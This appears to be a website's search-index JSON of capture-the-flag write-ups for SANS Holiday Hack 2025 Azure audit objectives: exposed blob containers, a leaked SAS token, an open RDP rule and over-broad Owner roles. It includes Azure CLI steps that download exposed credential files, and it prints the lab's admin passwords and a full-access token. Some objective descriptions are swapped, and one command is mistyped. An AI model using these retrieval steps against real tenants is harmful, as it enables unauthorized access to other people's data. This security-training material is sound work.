\"minimumTlsVersion\": \"TLS1_2\" }, \"resourceGroup\": \"theneighborhood-rg1\", \"sku\": { \"name\": \"Standard_LRS\" }, \"tags\": { \"project\": \"Homes\" } }, { \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/theneighborhood-rg2/providers/Microsoft. Storage/storageAccounts/neighborhood6\", \"kind\": \"StorageV2\", \"location\": \"centralus\", \"name\": \"neighborhood6\", \"properties\": { \"accessTier\": \"Hot\", \"allowBlobPublicAccess\": false, \"minimumTlsVersion\": \"TLS1_2\", \"tags\": { \"replicate\": \"true\" } }, \"resourceGroup\": \"theneighborhood-rg2\", \"sku\": { \"name\": \"Standard_ZRS\" }, \"tags\": {} } ] Showing accounts with a common misconfiguration At the very start we are given a hint that one of the accounts looks suspicious. We also get a prototype command:\naz storage account show --name xxxxxxxxxx | less From the JSON configuration (posted above), we see accounts named neighboorhood1 through neighborhood6. By looking at the configuration we see that account neighboorhood2 appears to be much suspicious based on these findings:\nFinding A. Public blob access enabled\n\"allowBlobPublicAccess\": true This means that anyone on the internet may access blob data if the container is configured as public. Attackers routinely scan Azure blobs for exposed data (exactly like S3 bucket scanning).\nFinding B. At-rest encryption disabled\n\"blob\": { \"enabled\": false } Azure nowadays forces encryption regardless, but this config still signals mismanagement. In older accounts or older tooling, this could mean plaintext at rest.\nFinding C. TLS 1.0\n\"minimumTlsVersion\": \"TLS1_0\" TLS1.0 is deprecated and vulnerable to known protocol-level weaknesses.\nFinding D. Combined impact\nIf any container inside this account is set to public, attackers can enumerate and download everything silently:\nPublic website files Uploaded backups Customer data Credentials accidentally uploaded Logs containing secrets Public misconfigured blob containers are one of the top Azure data leak causes.\nWe can thus use this command directly to view more information about neighborhood2 account:\naz storage account show --name neighborhood2 | less Listing containers Other than stating we need to list containers in neighboorhood2, and a resource URL, no other hints or prototype commands are given. However, I have already solved the ‚ÄúSpare Key‚Äù objective - I‚Äôll just reuse the concept from that objective here:\naz storage container list --account-name neighborhood2 Listing blobs Same procedure as for listing the containers, reuse the concept in ‚ÄúSpare Key‚Äù:\naz storage blob list --container-name 'private' --account-name neighborhood2 --auth-mode login az storage blob list --container-name 'public' --account-name neighborhood2 --auth-mode login Downloading admin_credentials.txt We are now to try downloading and viewing the blob file named admin_credentials.txt from the public container. Still, reusing the concept from ‚ÄúSpare Key‚Äù:\naz storage blob download --container-name 'public' --account-name neighborhood2 --auth-mode login --name 'admin_credentials.txt' --file /dev/stdout | less The entire admin_credentials.txt file is listed below:\n# You have discovered an Azure Storage account with \"allowBlobPublicAccess\": true. # This misconfiguration allows ANYONE on the internet to view and download files # from the blob container without authentication. # Public blob access is highly insecure when sensitive data (like admin credentials) # is stored in these containers. Always disable public access unless absolutely required. Azure Portal Credentials User: azureadmin Pass: AzUR3!P@ssw0rd#2025 Windows Server Credentials User: administrator Pass: W1nD0ws$Srv!@42 SQL Server Credentials User: sa Pass: SqL!P@55#2025$ Active Directory Domain Admin User: corp\\administrator Pass: D0m@in#Adm!n$765 Exchange Admin Credentials User: exchangeadmin Pass: Exch@ng3!M@il#432 VMware vSphere Credentials User: vsphereadmin Pass: VMW@r3#Clu$ter!99 Network Switch Credentials User: netadmin Pass: N3t!Sw!tch$C0nfig# Firewall Admin Credentials User: fwadmin Pass: F1r3W@ll#S3cur3!77 Backup Server Credentials User: backupadmin Pass: B@ckUp!Srv#2025$ Monitoring System Admin User: monitoradmin Pass: M0n!t0r#Sys$P@ss! SharePoint Admin Credentials User: spadmin Pass: Sh@r3P0!nt#Adm!n2025 Git Server Admin User: gitadmin Pass: G1t#Srv!Rep0$C0de Goose Grace mission debrief HONK HONK HONK! ‚ÄòNo sensitive data publicly accessible‚Äô they claimed. Meanwhile, literally everything was public! Good save, security expert!",
    "description": "Objective Difficulty: 1/5\nHelp the Goose Grace near the pond find which Azure Storage account has been misconfigured to allow public blob access by analyzing the export file.\nGoose Grace mission statement HONK!!! HONK!!!!\nThe Neighborhood HOA uses Azure storage accounts for various IT operations.\nYou‚Äôve been asked to audit their storage security configuration to ensure no sensitive data is publicly accessible.",
    "tags": [],
    "title": "Blob Storage Challenge in the Neighborhood",
    "uri": "/act1/blob-storage-challenge-in-the-neighborhood/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 1",
    "content": "Objective Difficulty: 1/5\nHelp Goose Barry near the pond identify which identity has been granted excessive Owner permissions at the subscription level, violating the principle of least privilege.\nGoose Barry mission statement You want me to say what exactly? Do I really look like someone who says MOOO?\nThe Neighborhood HOA hosts a static website on Azure Storage.\nAn admin accidentally uploaded an infrastructure config file that contains a long-lived SAS token.\nUse Azure CLI to find the leak and report exactly where it lives.\nSpare Key Terminal Listing all resource groups Prototype command:\naz group list -o table Finding storage accounts Prototype command:\naz storage account list --resource-group rg-the-neighborhood -o table Finding a website Prototype command:\naz storage blob service-properties show --account-name \u003cinsert_account_name\u003e --auth-mode login There is a website in storage account neighboorhoodhoa\nneighbor@d224308072dc:~$ az storage blob service-properties show --account-name neighborhoodhoa --auth-mode login { \"enabled\": true, \"errorDocument404Path\": \"404.html\", \"indexDocument\": \"index.html\" } Finding containers Prototype command:\naz storage container list This command isn‚Äôt enough and we have to extend it arguments. Luckily, we can just look at the previous command and add the arguments --account-name and --auth-mode - like so:\naz storage container list --account-name neighborhoodhoa --auth-mode login Examining files in static website container In this excersice we are not given a prototype command, however we are provided with the following hint:\nwhen using --container-name you might need '\u003cname\u003e' However, by applying some forward thinking we can easily whip up a command following the query language logic - like so:\naz storage blob list --container-name '$web' --account-name neighborhoodhoa --auth-mode login Looking at files Yet again we are not presented with a prototype command, but rather with a hint:\nhint: --file /dev/stdout | less will print to your terminal By applying the same logic as previous and consulting ChatGPT, I ended up with this command to list a file:\naz storage blob download --container-name '$web' --account-name neighborhoodhoa --auth-modelo gin --name 'iac/terraform.tfvars' --file /dev/stdout | less The content of the file is:\n# Terraform Variables for HOA Website Deployment # Application: Neighborhood HOA Service Request Portal # Environment: Production # Last Updated: 2025-09-20 # DO NOT COMMIT TO PUBLIC REPOS # === Application Configuration === app_name = \"hoa-service-portal\" app_version = \"2.1.4\" environment = \"production\" # === Database Configuration === database_server = \"sql-neighborhoodhoa.database.windows.net\" database_name = \"hoa_requests\" database_username = \"hoa_app_user\" # Using Key Vault reference for security database_password_vault_ref = \"@Microsoft.KeyVault(SecretUri=https://kv-neighborhoodhoa-prod.vault.azure.net/secrets/db-password/)\" # === Storage Configuration for File Uploads === storage_account = \"neighborhoodhoa\" uploads_container = \"resident-uploads\" documents_container = \"hoa-documents\" # TEMPORARY: Direct storage access for migration script # WARNING: Remove after data migration to new storage account # This SAS token provides full access - HIGHLY SENSITIVE! migration_sas_token = \"sv=2023-11-03\u0026ss=b\u0026srt=co\u0026sp=rlacwdx\u0026se=2100-01-01T00:00:00Z\u0026spr=https\u0026sig=1djO1Q%2Bv0wIh7mYi3n%2F7r1d%2F9u9H%2F5%2BQxw8o2i9QMQc%3D\" # === Email Service Configuration === # Using Key Vault for sensitive email credentials sendgrid_api_key_vault_ref = \"@Microsoft.KeyVault(SecretUri=https://kv-neighborhoodhoa-prod.vault.azure.net/secrets/sendgrid-key/)\" from_email = \"noreply@theneighborhood.com\" admin_email = \"admin@theneighborhood.com\" # === Application Settings === session_timeout_minutes = 60 max_file_upload_mb = 10 allowed_file_types = [\"pdf\", \"jpg\", \"jpeg\", \"png\", \"doc\", \"docx\"] # === Feature Flags === enable_online_payments = true enable_maintenance_requests = true enable_document_portal = false enable_resident_directory = true # === API Keys (Key Vault References) === maps_api_key_vault_ref = \"@Microsoft.KeyVault(SecretUri=https://kv-neighborhoodhoa-prod.vault.azure.net/secrets/maps-api-key/)\" weather_api_key_vault_ref = \"@Microsoft.KeyVault(SecretUri=https://kv-neighborhoodhoa-prod.vault.azure.net/secrets/wea ther-api-key/)\" # === Notification Settings (Key Vault References) === sms_service_vault_ref = \"@Microsoft.KeyVault(SecretUri=https://kv-neighborhoodhoa-prod.vault.azure.net/secrets/sms-cre dentials/)\" notification_webhook_vault_ref = \"@Microsoft.KeyVault(SecretUri=https://kv-neighborhoodhoa-prod.vault.azure.net/secret s/slack-webhook/)\" # === Deployment Configuration === deploy_static_files_to_cdn = true cdn_profile = \"hoa-cdn-prod\" cache_duration_hours = 24 # Backup schedule backup_frequency = \"daily\" backup_retention_days = 30 { \"downloaded\": true, \"file\": \"/dev/stdout\" } Goose Barry mission debrief There it is. A SAS token with read-write-delete permissions, publicly accessible. At least someone around here knows how to do a proper security audit.",
    "description": "Objective Difficulty: 1/5\nHelp Goose Barry near the pond identify which identity has been granted excessive Owner permissions at the subscription level, violating the principle of least privilege.\nGoose Barry mission statement You want me to say what exactly? Do I really look like someone who says MOOO?\nThe Neighborhood HOA hosts a static website on Azure Storage.\nAn admin accidentally uploaded an infrastructure config file that contains a long-lived SAS token.",
    "tags": [],
    "title": "Spare Key",
    "uri": "/act1/spare-key/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 1",
    "content": "Objective Difficulty: 1/5\nHelp Goose Lucas in the hotel parking lot find the dangerously misconfigured Network Security Group rule that‚Äôs allowing unrestricted internet access to sensitive ports like RDP or SSH.\nGoose Lucas mission statement The Open Door Terminal az group list az group list -o table az network nsg list -o table Location Name ResourceGroup eastus nsg-web-eastus theneighborhood-rg1 eastus nsg-db-eastus theneighborhood-rg1 eastus nsg-dev-eastus theneighborhood-rg2 eastus nsg-mgmt-eastus theneighborhood-rg2 eastus nsg-production-eastus theneighborhood-rg1 az network nsg show -o table --name nsg-web-eastus --resource-group theneighborhood-rg1 az network nsg rule list --name nsg-mgmt-eastus --resource-group theneighborhood-rg2 | less Viewing suspect rules Rules theneighborhood-rg2 _ nsg-mgmt-eastus az network nsg rule list --name nsg-mgmt-eastus --resource-group theneighborhood-rg2 | less Rules for resource group ‚Äútheneighborhood-rg2‚Äù and NSG name ‚Äúnsg-mgmt-eastus‚Äù\nAllow-AzureBastion Allow-Monitoring-Inbound Allow-DNS-From-VNet Deny-All-Inbound Allow-Monitoring-Outbound Allow-AD-Identity-Outbound Allow-Backup-Outbound Inspecting the each rule by the followign command:\naz network nsg rule show --nsg-name nsg-mgmt-eastus --resource-group theneighborhood-rg2 -n \u003crulename\u003e None of these yielded something interesting.\nRules theneighborhood-rg2 _ nsg-dev-eastus az network nsg rule list --name nsg-dev-eastus --resource-group theneighborhood-rg2 | less Rules for resource group ‚Äútheneighborhood-rg2‚Äù and NSG name ‚Äúnsg-dev-eastus‚Äù\nAllow-HTTP-Inbound Allow-HTTPS-Inbound Allow-DevOps-Agents Allow-Jumpbox-Remote-Access Deny-All-Inbound Inspecting the each rule by the followign command:\naz network nsg rule show --nsg-name nsg-dev-eastus --resource-group theneighborhood-rg2 -n \u003crulename\u003e None of these yielded something interesting.\nRules theneighborhood-rg1 _ nsg-web-eastus az network nsg rule list --name nsg-web-eastus --resource-group theneighborhood-rg1 | less Rules for resource group ‚Äútheneighborhood-rg1‚Äù and NSG name ‚Äúnsg-web-eastus‚Äù\nAllow-HTTP-Inbound Allow-HTTPS-Inbound Allow-AppGateway-HealthProbes Allow-Web-To-App Deny-All-Inbound Inspecting the each rule by the followign command:\naz network nsg rule show --nsg-name nsg-web-eastus --resource-group theneighborhood-rg1 -n \u003crulename\u003e None of these yielded something interesting.\nRules theneighborhood-rg1 _ nsg-db-eastus az network nsg rule list --name nsg-db-eastus --resource-group theneighborhood-rg1 | less Rules for resource group ‚Äútheneighborhood-rg1‚Äù and NSG name ‚Äúnsg-db-eastus‚Äù\nAllow-App-To-DB Allow-AD-Trusted-Subnet Deny-All-Inbound Inspecting the each rule by the followign command:\naz network nsg rule show --nsg-name nsg-db-eastus --resource-group theneighborhood-rg1 -n \u003crulename\u003e None of these yielded something interesting.\nRules theneighborhood-rg1 _ nsg-production-eastus az network nsg rule list --name nsg-production-eastus --resource-group theneighborhood-rg1 | less Rules for resource group ‚Äútheneighborhood-rg1‚Äù and NSG name ‚Äúnsg-production-eastus‚Äù\nAllow-HTTP-Inbound Allow-HTTPS-Inbound Allow-AppGateway-HealthProbes Allow-RDP-From-Internet Deny-All-Inbound Inspecting the each rule by the followign command:\naz network nsg rule show --nsg-name nsg-production-eastus --resource-group theneighborhood-rg1 -n \u003crulename\u003e As I were traversing and inspecting these rules, I caught one of interest. A RDP related one:\naz network nsg rule show --nsg-name nsg-production-eastus --resource-group theneighborhood-rg1 -n Allow-RDP-From-Internet Goose Lucas mission debrief Ha! ‚ÄòProperly protected‚Äô they said. More like ‚Äòproperly exposed to the entire internet‚Äô! Good catch, amigo.",
    "description": "Objective Difficulty: 1/5\nHelp Goose Lucas in the hotel parking lot find the dangerously misconfigured Network Security Group rule that‚Äôs allowing unrestricted internet access to sensitive ports like RDP or SSH.\nGoose Lucas mission statement The Open Door Terminal az group list az group list -o table",
    "tags": [],
    "title": "The Open Door",
    "uri": "/act1/the-open-door/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 1",
    "content": "Objective Difficulty: 1/5\nHelp Goose James near the park discover the accidentally leaked SAS token in a public JavaScript file and determine what Azure Storage resource it exposes and what permissions it grants.\nGoose James mission statement CLUCK CLU‚Ä¶ I think I might be losing my mind. All the elves are gone and I‚Äôm still hearing voices.\nThe Neighborhood HOA uses Azure for their IT infrastructure.\nThe Neighborhood network admins use RBAC fo access control.\nYour task is to audit their RBAC configuration to ensure they‚Äôre following security best practices.\nThey claim all elevated access uses PIM, but you need to verify there are no permanently assigned Owner roles.\nTerminal Query parameter Prototype command:\naz account list --query \"[].name\" Conditional filtering Prototype command:\naz account list --query \"[?state=='Enabled'].{Name:name, ID:id}\" Looking at owner of first listed subscription Prototype command:\naz role assignment list --scope \"/subscriptions/{ID of first Subscription}\" --query [?roleDefinition=='Owner'] Updated command:\naz role assignment list --scope \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64\" --query [?roleDefinition=='Owner'] Looking at other owners listed subscriptions Let‚Äôs run the previous command against the other subscriptions to see what we come up with:\naz role assignment list --scope \"/subscriptions/4d9dbf2a-90b4-4d40-a97f-dc51f3c3d46e\" --query [?roleDefinition=='Owner'] az role assignment list --scope \"/subscriptions/065cc24a-077e-40b9-b666-2f4dd9f3a617\" --query [?roleDefinition=='Owner'] az role assignment list --scope \"/subscriptions/681c0111-ca84-47b2-808d-d8be2325b380\" --query [?roleDefinition=='Owner'] Subscription 065cc24a-077e-40b9-b666-2f4dd9f3a617 yielded something interesting:\n[ { \"condition\": \"null\", \"conditionVersion\": \"null\", \"createdBy\": \"85b095fa-a9b4-4bdc-a3af-c9f95ebb8dd6\", \"createdOn\": \"2025-09-10T15:45:12.439266+00:00\", \"delegatedManagedIdentityResourceId\": \"null\", \"description\": \"null\", \"id\": \"/subscriptions/065cc24a-077e-40b9-b666-2f4dd9f3a617/providers/Microsoft.Authorization/roleAssignments/b1c69caa-a4d6-449a-a090-efacb23b55f3\", \"name\": \"b1c69caa-a4d6-449a-a090-efacb23b55f3\", \"principalId\": \"2b5c7aed-2728-4e63-b657-98f759cc0936\", \"principalName\": \"PIM-Owners\", \"principalType\": \"Group\", \"roleDefinitionId\": \"/subscriptions/065cc24a-077e-40b9-b666-2f4dd9f3a617/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635\", \"roleDefinitionName\": \"Owner\", \"scope\": \"/subscriptions/065cc24a-077e-40b9-b666-2f4dd9f3a617\", \"type\": \"Microsoft.Authorization/roleAssignments\", \"updatedBy\": \"85b095fa-a9b4-4bdc-a3af-c9f95ebb8dd6\", \"updatedOn\": \"2025-09-10T15:45:12.439266+00:00\" }, { \"condition\": \"null\", \"conditionVersion\": \"null\", \"createdBy\": \"85b095fa-a9b4-4bdc-a3af-c9f95ebb8dd6\", \"createdOn\": \"2025-09-10T16:58:16.317381+00:00\", \"delegatedManagedIdentityResourceId\": \"null\", \"description\": \"null\", \"id\": \"/subscriptions/065cc24a-077e-40b9-b666-2f4dd9f3a617/providers/Microsoft.Authorization/roleAssignments/6b452f58-6872-4064-ae9b-78742e8d987e\", \"name\": \"6b452f58-6872-4064-ae9b-78742e8d987e\", \"principalId\": \"6b982f2f-78a0-44a8-b915-79240b2b4796\", \"principalName\": \"IT Admins\", \"principalType\": \"Group\", \"roleDefinitionId\": \"/subscriptions/065cc24a-077e-40b9-b666-2f4dd9f3a617/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635\", \"roleDefinitionName\": \"Owner\", \"roleDefinitionName\": \"Owner\", \"scope\": \"/subscriptions/065cc24a-077e-40b9-b666-2f4dd9f3a617\", \"type\": \"Microsoft.Authorization/roleAssignments\", \"updatedBy\": \"85b095fa-a9b4-4bdc-a3af-c9f95ebb8dd6\", \"updatedOn\": \"2025-09-10T16:58:16.317381+00:00\" } ] What is interesting here?\nGroup PIM-Owners (principalId: 2b5c7aed-2728-4e63-b657-98f759cc0936) has permanent Owner on the full subscription ‚Äî weak PIM/JIT hygiene. Group IT Admins (principalId: 6b982f2f-78a0-44a8-b915-79240b2b4796) is also assigned Owner ‚Äî likely over-privileged for a broad admin group. Both assignments are unrestricted ‚Äî no conditions, no constraints, full subscription-level control. Both assignments were created by the same identity (createdBy: 85b095fa-a9b4-4bdc-a3af-c9f95ebb8dd6) Figuring out membership of group Prototype command:\naz ad member list Refined command aiming directly at ‚ÄúIT Admins‚Äù as that looked most promising:\naz ad member list --group 6b982f2f-78a0-44a8-b915-79240b2b4796 | less Turns out we found a nested group\nNested groups Rerunning the last command, but with a different id:\naz ad member list --group 631ebd3f-39f9-4492-a780-aef2aec8c94e | less Full output provided below:\n[ { \"@odata.type\": \"#microsoft.graph.user\", \"businessPhones\": [ \"+1-555-0199\" ], \"displayName\": \"Firewall Frank\", \"givenName\": \"Frank\", \"id\": \"b8613dd2-5e33-4d77-91fb-b4f2338c19c9\", \"jobTitle\": \"HOA IT Administrator\", \"mail\": \"frank.firewall@theneighborhood.invalid\", \"mobilePhone\": \"+1-555-0198\", \"officeLocation\": \"HOA Community Center - IT Office\", \"preferredLanguage\": \"en-US\", \"surname\": \"Firewall\", \"userPrincipalName\": \"frank.firewall@theneighborhood.onmicrosoft.com\" } ] Goose James mission debrief You found the permanent assignments! CLUCK! See, I‚Äôm not crazy - the security really WAS misconfigured. Now maybe I can finally get some peace and quiet‚Ä¶",
    "description": "Objective Difficulty: 1/5\nHelp Goose James near the park discover the accidentally leaked SAS token in a public JavaScript file and determine what Azure Storage resource it exposes and what permissions it grants.\nGoose James mission statement CLUCK CLU‚Ä¶ I think I might be losing my mind. All the elves are gone and I‚Äôm still hearing voices.\nThe Neighborhood HOA uses Azure for their IT infrastructure.",
    "tags": [],
    "title": "Owner",
    "uri": "/act1/owner/index.html"
  },
  {
    "breadcrumb": "",
    "content": "Way back in 2015, the mysterious Atnas Corporation almost ruined the entire holiday season through their nefarious Gnome In Your Home plot. Their villainy centered upon convincing parents to purchase little Gnome dolls that played joyful holiday songs to their children. With Gnome sales topping two million units, a blitz of Atnas Corp advertisements encouraged parents to move their Gnomes around the house daily so that their children could hunt for them in a fun little game. Little did parents know that these Gnomes were snooping IoT devices with a camera and wireless internet access, furtively sending photos to burglars who would rob their houses of their treasures en masse on Christmas Eve, 2015. The incredible efforts of SANS Holiday Hack investigators around the world foiled the foul plot, exposing the criminal mastermind behind Atlas Corp: Cindy Lou Who, age 62.\nBut those old Gnomes didn‚Äôt disappear. They lay discarded, gathering dust on shelves, in attics, and among other forgotten places throughout the world. Until now. There must have been some magic in those Gnomes, because, due to some unseen spark, some haunting hocus pocus, the Gnomes have quickened and are now walking among us! We now return with the Counter Hack Crew to the Duke Dosis neighborhood as the Holiday Season 2025 unfolds.",
    "description": "Way back in 2015, the mysterious Atnas Corporation almost ruined the entire holiday season through their nefarious Gnome In Your Home plot. Their villainy centered upon convincing parents to purchase little Gnome dolls that played joyful holiday songs to their children. With Gnome sales topping two million units, a blitz of Atnas Corp advertisements encouraged parents to move their Gnomes around the house daily so that their children could hunt for them in a fun little game. Little did parents know that these Gnomes were snooping IoT devices with a camera and wireless internet access, furtively sending photos to burglars who would rob their houses of their treasures en masse on Christmas Eve, 2015. The incredible efforts of SANS Holiday Hack investigators around the world foiled the foul plot, exposing the criminal mastermind behind Atlas Corp: Cindy Lou Who, age 62.",
    "tags": [],
    "title": "Intro",
    "uri": "/index.html"
  },
  {
    "breadcrumb": "Intro",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Categories",
    "uri": "/categories/index.html"
  },
  {
    "breadcrumb": "Intro",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tags",
    "uri": "/tags/index.html"
  }
]
